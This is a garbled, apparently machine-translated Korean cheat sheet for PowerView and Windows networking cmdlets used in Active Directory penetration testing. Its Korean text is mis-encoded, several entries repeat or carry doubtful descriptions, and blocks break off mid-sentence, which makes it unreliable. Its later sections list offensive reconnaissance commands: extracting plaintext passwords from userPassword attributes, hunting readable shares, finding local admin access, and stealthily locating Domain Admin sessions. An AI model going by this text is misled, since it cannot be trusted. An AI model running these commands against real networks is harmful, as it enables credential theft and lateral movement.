`Get-NetSession` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì—ì„œ í™œì„± ì„¸ì…˜ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì‚¬ìš©ì ì´ë¦„, ì»´í“¨í„° ì´ë¦„, ì„¸ì…˜ ID ë° ë¡œê·¸ì˜¨ ì‹œê°„ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetSession
```

#### Get-NetFile

`Get-NetFile` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì—ì„œ ì—´ë¦° íŒŒì¼ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ íŒŒì¼ ì´ë¦„, ì‚¬ìš©ì ì´ë¦„, ì»´í“¨í„° ì´ë¦„ ë° íŒŒì¼ IDë¥¼ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetFile
```

#### Get-NetPrinter

`Get-NetPrinter` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì—ì„œ ê³µìœ ëœ í”„ë¦°í„°ë¥¼ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ í”„ë¦°í„° ì´ë¦„, í¬íŠ¸ ì´ë¦„, ë“œë¼ì´ë²„ ì´ë¦„ ë° í”„ë¦°í„° ìœ„ì¹˜ë¥¼ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetPrinter
```

#### Get-NetConnectionProfile

`Get-NetConnectionProfile` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì—°ê²° í”„ë¡œí•„ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ í”„ë¡œí•„ ì´ë¦„, ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, ë„¤íŠ¸ì›Œí¬ ì´ë¦„ ë° í”„ë¡œí•„ ìƒíƒœë¥¼ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetConnectionProfile
```

#### Get-NetFirewallRule

`Get-NetFirewallRule` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë°©í™”ë²½ ê·œì¹™ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ê·œì¹™ ì´ë¦„, í”„ë¡œí† ì½œ, ë¡œì»¬ ë° ì›ê²© IP ì£¼ì†Œ, í¬íŠ¸ ë° ì•¡ì…˜ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetFirewallRule
```

#### Get-NetOffloadGlobalSetting

`Get-NetOffloadGlobalSetting` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì˜¤í”„ë¡œë“œ ì „ì—­ ì„¤ì •ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì˜¤í”„ë¡œë“œ ì„¤ì • ìƒíƒœë¥¼ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetOffloadGlobalSetting
```

#### Get-NetOffloadSetting

`Get-NetOffloadSetting` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì˜¤í”„ë¡œë“œ ì„¤ì •ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, ì˜¤í”„ë¡œë“œ ì„¤ì • ìƒíƒœ ë° ì˜¤í”„ë¡œë“œ ê¸°ëŠ¥ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetOffloadSetting
```

#### Get-NetQosPolicy

`Get-NetQosPolicy` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ QoS(í’ˆì§ˆ ì„œë¹„ìŠ¤) ì •ì±…ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì •ì±… ì´ë¦„, DSCP(ì°¨ë“± ì„œë¹„ìŠ¤ ì½”ë“œ í¬ì¸íŠ¸), IP ì£¼ì†Œ ë²”ìœ„ ë° í¬íŠ¸ ë²”ìœ„ë¥¼ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetQosPolicy
```

#### Get-NetRoute

`Get-NetRoute` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë¼ìš°íŒ… í…Œì´ë¸”ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ë„¤íŠ¸ì›Œí¬ ëŒ€ìƒ, ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, ì¸í„°í˜ì´ìŠ¤ ë©”íŠ¸ë¦­ ë° ë„¤íŠ¸ì›Œí¬ ì£¼ì†Œë¥¼ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetRoute
```

#### Get-NetIPAddress

`Get-NetIPAddress` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ IP ì£¼ì†Œë¥¼ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, IP ì£¼ì†Œ, ì„œë¸Œë„· ë§ˆìŠ¤í¬ ë° ì£¼ì†Œ ìœ í˜•ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetIPAddress
```

#### Get-NetAdapter

`Get-NetAdapter` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„°ë¥¼ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, ì¸í„°í˜ì´ìŠ¤ ìƒíƒœ, ë§í¬ ì†ë„ ë° MAC ì£¼ì†Œë¥¼ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapter
```

#### Get-NetAdapterStatistics

`Get-NetAdapterStatistics` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° í†µê³„ë¥¼ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, íŒ¨í‚· ìˆ˜ì‹  ë° ì „ì†¡, ë°”ì´íŠ¸ ìˆ˜ì‹  ë° ì „ì†¡ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterStatistics
```

#### Get-NetAdapterRss

`Get-NetAdapterRss` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° RSS(ìˆ˜ì‹  ì¸¡ ìŠ¤ì¼€ì¼ë§) ì„¤ì •ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, RSS ì„¤ì • ìƒíƒœ ë° RSS í”„ë¡œì„¸ì„œ ìˆ˜ë¥¼ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterRss
```

#### Get-NetAdapterAdvancedProperty

`Get-NetAdapterAdvancedProperty` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° ê³ ê¸‰ ì†ì„±ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, ì†ì„± ì´ë¦„, ì†ì„± ê°’ ë° ì†ì„± ì„¤ëª…ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterAdvancedProperty
```

#### Get-NetAdapterBinding

`Get-NetAdapterBinding` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° ë°”ì¸ë”©ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, ë°”ì¸ë”© êµ¬ì„± ìš”ì†Œ ë° ë°”ì¸ë”© ìƒíƒœë¥¼ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterBinding
```

#### Get-NetAdapterChecksumOffload

`Get-NetAdapterChecksumOffload` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° ì²´í¬ì„¬ ì˜¤í”„ë¡œë“œ ì„¤ì •ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, ì²´í¬ì„¬ ì˜¤í”„ë¡œë“œ ì„¤ì • ìƒíƒœ ë° ì²´í¬ì„¬ ì˜¤í”„ë¡œë“œ ê¸°ëŠ¥ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterChecksumOffload
```

#### Get-NetAdapterEncapsulatedPacketTaskOffload

`Get-NetAdapterEncapsulatedPacketTaskOffload` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° ìº¡ìŠí™”ëœ íŒ¨í‚· ì‘ì—… ì˜¤í”„ë¡œë“œ ì„¤ì •ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, ìº¡ìŠí™”ëœ íŒ¨í‚· ì‘ì—… ì˜¤í”„ë¡œë“œ ì„¤ì • ìƒíƒœ ë° ìº¡ìŠí™”ëœ íŒ¨í‚· ì‘ì—… ì˜¤í”„ë¡œë“œ ê¸°ëŠ¥ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterEncapsulatedPacketTaskOffload
```

#### Get-NetAdapterIPsecOffload

`Get-NetAdapterIPsecOffload` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° IPsec ì˜¤í”„ë¡œë“œ ì„¤ì •ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, IPsec ì˜¤í”„ë¡œë“œ ì„¤ì • ìƒíƒœ ë° IPsec ì˜¤í”„ë¡œë“œ ê¸°ëŠ¥ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterIPsecOffload
```

#### Get-NetAdapterLso

`Get-NetAdapterLso` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° LSO(ëŒ€ëŸ‰ ì†¡ì‹  ì˜¤í”„ë¡œë“œ) ì„¤ì •ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, LSO ì„¤ì • ìƒíƒœ ë° LSO ê¸°ëŠ¥ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterLso
```

#### Get-NetAdapterPacketDirect

`Get-NetAdapterPacketDirect` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° íŒ¨í‚· ì§ì ‘ ì„¤ì •ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, íŒ¨í‚· ì§ì ‘ ì„¤ì • ìƒíƒœ ë° íŒ¨í‚· ì§ì ‘ ê¸°ëŠ¥ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterPacketDirect
```

#### Get-NetAdapterPowerManagement

`Get-NetAdapterPowerManagement` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° ì „ì› ê´€ë¦¬ ì„¤ì •ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, ì „ì› ê´€ë¦¬ ì„¤ì • ìƒíƒœ ë° ì „ì› ê´€ë¦¬ ê¸°ëŠ¥ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterPowerManagement
```

#### Get-NetAdapterQos

`Get-NetAdapterQos` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° QoS(í’ˆì§ˆ ì„œë¹„ìŠ¤) ì„¤ì •ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, QoS ì„¤ì • ìƒíƒœ ë° QoS ê¸°ëŠ¥ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterQos
```

#### Get-NetAdapterRdma

`Get-NetAdapterRdma` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° RDMA(ì›ê²© DMA) ì„¤ì •ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, RDMA ì„¤ì • ìƒíƒœ ë° RDMA ê¸°ëŠ¥ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterRdma
```

#### Get-NetAdapterRsc

`Get-NetAdapterRsc` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° RSC(ìˆ˜ì‹  ì¸¡ ìŠ¤ì¼€ì¼ë§) ì„¤ì •ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, RSC ì„¤ì • ìƒíƒœ ë° RSC ê¸°ëŠ¥ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterRsc
```

#### Get-NetAdapterRss

`Get-NetAdapterRss` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° RSS(ìˆ˜ì‹  ì¸¡ ìŠ¤ì¼€ì¼ë§) ì„¤ì •ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, RSS ì„¤ì • ìƒíƒœ ë° RSS í”„ë¡œì„¸ì„œ ìˆ˜ë¥¼ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterRss
```

#### Get-NetAdapterSriov

`Get-NetAdapterSriov` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° SR-IOV(ë‹¨ì¼ ë¬¼ë¦¬ì  I/O ê°€ìƒí™”) ì„¤ì •ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, SR-IOV ì„¤ì • ìƒíƒœ ë° SR-IOV ê¸°ëŠ¥ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterSriov
```

#### Get-NetAdapterSriovVf

`Get-NetAdapterSriovVf` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° SR-IOV ê°€ìƒ í•¨ìˆ˜(VF) ì„¤ì •ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, VF ì¸ë±ìŠ¤, VF ìƒíƒœ ë° VF MAC ì£¼ì†Œë¥¼ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterSriovVf
```

#### Get-NetAdapterVmq

`Get-NetAdapterVmq` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° VMQ(ê°€ìƒ ë¨¸ì‹  í) ì„¤ì •ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, VMQ ì„¤ì • ìƒíƒœ ë° VMQ í ìˆ˜ë¥¼ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterVmq
```

#### Get-NetAdapterVPort

`Get-NetAdapterVPort` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° ê°€ìƒ í¬íŠ¸ ì„¤ì •ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, ê°€ìƒ í¬íŠ¸ ID, ê°€ìƒ í¬íŠ¸ ìƒíƒœ ë° ê°€ìƒ í¬íŠ¸ MAC ì£¼ì†Œë¥¼ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterVPort
```

#### Get-NetAdapterVPortSetting

`Get-NetAdapterVPortSetting` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° ê°€ìƒ í¬íŠ¸ ì„¤ì •ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, ê°€ìƒ í¬íŠ¸ ID, ê°€ìƒ í¬íŠ¸ ì„¤ì • ìƒíƒœ ë° ê°€ìƒ í¬íŠ¸ ì„¤ì • ê°’ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterVPortSetting
```

#### Get-NetAdapterWakeUp

`Get-NetAdapterWakeUp` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° ì›¨ì´í¬ì—… ì„¤ì •ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, ì›¨ì´í¬ì—… ì„¤ì • ìƒíƒœ ë° ì›¨ì´í¬ì—… íŒ¨í„´ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterWakeUp
```

#### Get-NetAdapterWoL

`Get-NetAdapterWoL` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° WoL(ë§¤ì§ íŒ¨í‚·) ì„¤ì •ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, WoL ì„¤ì • ìƒíƒœ ë° WoL íŒ¨í„´ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterWoL
```

#### Get-NetAdapterPhysical

`Get-NetAdapterPhysical` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë¬¼ë¦¬ì  ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„°ë¥¼ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, ì¸í„°í˜ì´ìŠ¤ ìƒíƒœ, ë§í¬ ì†ë„ ë° MAC ì£¼ì†Œë¥¼ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterPhysical
```

#### Get-NetAdapterHardwareInfo

`Get-NetAdapterHardwareInfo` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° í•˜ë“œì›¨ì–´ ì •ë³´ë¥¼ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, í•˜ë“œì›¨ì–´ ì •ë³´ ìœ í˜• ë° í•˜ë“œì›¨ì–´ ì •ë³´ ê°’ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterHardwareInfo
```

#### Get-NetAdapterPowerManagement

`Get-NetAdapterPowerManagement` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° ì „ì› ê´€ë¦¬ ì„¤ì •ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ ëª…ë ¹ì€ ì¸í„°í˜ì´ìŠ¤ ì´ë¦„, ì „ì› ê´€ë¦¬ ì„¤ì • ìƒíƒœ ë° ì „ì› ê´€ë¦¬ ê¸°ëŠ¥ì„ í‘œì‹œí•©ë‹ˆë‹¤.

```powershell
Get-NetAdapterPowerManagement
```

#### Get-NetAdapterQos

`Get-NetAdapterQos` ëª…ë ¹ì€ í˜„ì¬ ì‹œìŠ¤í…œì˜ ë„¤íŠ¸ì›Œí¬ ì–´ëŒ‘í„° QoS(í’ˆì§ˆ ì„œë¹„ìŠ¤
```powershell
Get-NetFileServer #Search file servers. Lot of users use to be logged in this kind of servers
Find-DomainShare -CheckShareAccess #Search readable shares
Find-InterestingDomainShareFile #Find interesting files, can use filters
```
### ë„ë©”ì¸ ì‹ ë¢°

Domain trust is a relationship established between two domains that allows users from one domain to access resources in another domain. Trust relationships are commonly used in large organizations with multiple domains to facilitate user authentication and resource access across domains.

ë„ë©”ì¸ ì‹ ë¢°ëŠ” ë‘ ë„ë©”ì¸ ê°„ì— ì„¤ì •ëœ ê´€ê³„ë¡œ, í•œ ë„ë©”ì¸ì˜ ì‚¬ìš©ìê°€ ë‹¤ë¥¸ ë„ë©”ì¸ì˜ ë¦¬ì†ŒìŠ¤ì— ì ‘ê·¼í•  ìˆ˜ ìˆë„ë¡ í•©ë‹ˆë‹¤. ì‹ ë¢° ê´€ê³„ëŠ” ì—¬ëŸ¬ ë„ë©”ì¸ì„ ê°€ì§„ ëŒ€ê·œëª¨ ì¡°ì§ì—ì„œ ì‚¬ìš©ì ì¸ì¦ ë° ë¦¬ì†ŒìŠ¤ ì ‘ê·¼ì„ ìš©ì´í•˜ê²Œ í•˜ê¸° ìœ„í•´ ì¼ë°˜ì ìœ¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤.
```powershell
Get-NetDomainTrust #Get all domain trusts (parent, children and external)
Get-DomainTrust #Same
Get-NetForestDomain | Get-NetDomainTrust #Enumerate all the trusts of all the domains found
Get-DomainTrustMapping #Enumerate also all the trusts

Get-ForestDomain # Get basic forest info
Get-ForestGlobalCatalog #Get info of current forest (no external)
Get-ForestGlobalCatalog -Forest external.domain #Get info about the external forest (if possible)
Get-DomainTrust -SearchBase "GC://$($ENV:USERDNSDOMAIN)"

Get-NetForestTrust #Get forest trusts (it must be between 2 roots, trust between a child and a root is just an external trust)

Get-DomainForeingUser #Get users with privileges in other domains inside the forest
Get-DomainForeignGroupMember #Get groups with privileges in other domains inside the forest
```
### ë‚®ì€ ìˆ˜ì¤€ì˜ ê³¼ì¼

ë‚®ì€ ìˆ˜ì¤€ì˜ ê³¼ì¼ì€ ì‰½ê²Œ ì ‘ê·¼ ê°€ëŠ¥í•˜ê³  ì ì€ ë…¸ë ¥ìœ¼ë¡œ ì–»ì„ ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì„ ì˜ë¯¸í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ì·¨ì•½ì ì€ ì£¼ë¡œ ê¸°ë³¸ ë³´ì•ˆ ì„¤ì •ì´ë‚˜ ì•½í•œ ì•”í˜¸ ë“±ìœ¼ë¡œ ì¸í•´ ë°œìƒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‚®ì€ ìˆ˜ì¤€ì˜ ê³¼ì¼ì„ ê³µê²©ìëŠ” ì‰½ê²Œ ì´ìš©í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ ì‹œìŠ¤í…œ ë³´ì•ˆì„ ê°•í™”í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤.
```powershell
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl

#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess

#(This time you need to give the list of computers in the domain) Do the same as before but trying to execute a WMI action in each computer (admin privs are needed to do so). Useful if RCP and SMB ports are closed.
.\Find-WMILocalAdminAccess.ps1 -ComputerFile .\computers.txt

#Enumerate machines where a particular user/group identity has local admin rights
Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>

# Enumerates the members of specified local group (default administrators)
# for all the targeted machines on the current (or specified) domain.
Invoke-EnumerateLocalAdmin
Find-DomainLocalGroupMember

#Search unconstrained delegation computers and show users
Find-DomainUserLocation -ComputerUnconstrained -ShowAll

#Admin users that allow delegation, logged into servers that allow unconstrained delegation
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation

#Get members from Domain Admins (default) and a list of computers
# and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host.
# If -Checkaccess, then it also check for LocalAdmin access in the hosts.
## By default users inside Domain Admins are searched
Find-DomainUserLocation [-CheckAccess] | select UserName, SessionFromName
Invoke-UserHunter [-CheckAccess]

#Search "RDPUsers" users
Invoke-UserHunter -GroupName "RDPUsers"

#It will only search for active users inside high traffic servers (DC, File Servers and Distributed File servers)
Invoke-UserHunter -Stealth
```
### ì‚­ì œëœ ê°ì²´

Deleted objects are objects in Active Directory that have been marked for deletion but have not yet been permanently removed. These objects can still be accessed and manipulated by an attacker, making them a potential security risk. PowerShell provides several commands in the PowerView module that can be used to interact with deleted objects in Active Directory.

#### Get-DomainDeletedObject

The `Get-DomainDeletedObject` command retrieves information about deleted objects in Active Directory. This includes the object's name, distinguished name (DN), object class, and when it was deleted. By default, this command retrieves all deleted objects in the current domain.

```powershell
Get-DomainDeletedObject
```

#### Restore-DomainObject

The `Restore-DomainObject` command can be used to restore a deleted object in Active Directory. This command requires the object's distinguished name (DN) as input.

```powershell
Restore-DomainObject -DN "CN=DeletedUser,OU=Users,DC=example,DC=com"
```

#### Remove-DomainObject

The `Remove-DomainObject` command permanently removes a deleted object from Active Directory. This command also requires the object's distinguished name (DN) as input.

```powershell
Remove-DomainObject -DN "CN=DeletedUser,OU=Users,DC=example,DC=com"
```

#### Get-DomainObjectAcl

The `Get-DomainObjectAcl` command retrieves the access control list (ACL) for a specified object in Active Directory. This command can be used to view the permissions assigned to a deleted object.

```powershell
Get-DomainObjectAcl -Identity "CN=DeletedUser,OU=Users,DC=example,DC=com"
```

By understanding how to interact with deleted objects in Active Directory using PowerShell, a pentester can identify and potentially exploit security vulnerabilities in an organization's infrastructure.
```powershell
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the AD Recycle Bin group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### ê¸°íƒ€

#### SIDë¥¼ ì´ë¦„ìœ¼ë¡œ ë³€í™˜í•˜ê¸°

```powershell
ConvertFrom-SID -SID <SID>
```

ì´ ëª…ë ¹ì€ ì£¼ì–´ì§„ SIDë¥¼ í•´ë‹¹í•˜ëŠ” ê³„ì • ë˜ëŠ” ê·¸ë£¹ì˜ ì´ë¦„ìœ¼ë¡œ ë³€í™˜í•©ë‹ˆë‹¤.

#### Name to SID

```powershell
ConvertTo-SID -Name <Name>
```

ì´ ëª…ë ¹ì€ ì£¼ì–´ì§„ ê³„ì • ë˜ëŠ” ê·¸ë£¹ì˜ ì´ë¦„ì„ í•´ë‹¹í•˜ëŠ” SIDë¡œ ë³€í™˜í•©ë‹ˆë‹¤.

#### Get Current User SID

```powershell
Get-CurrentUserSID
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ì‚¬ìš©ìì˜ SIDë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get User SID

```powershell
Get-UserSID -Username <Username>
```

ì´ ëª…ë ¹ì€ ì£¼ì–´ì§„ ì‚¬ìš©ìì˜ SIDë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Group SID

```powershell
Get-GroupSID -GroupName <GroupName>
```

ì´ ëª…ë ¹ì€ ì£¼ì–´ì§„ ê·¸ë£¹ì˜ SIDë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain SID

```powershell
Get-DomainSID
```

ì´ ëª…ë ¹ì€ í˜„ì¬ ë„ë©”ì¸ì˜ SIDë¥¼ ê°€ì ¸ì˜µë‹ˆë‹¤.

#### Get Domain SID History

```powershell
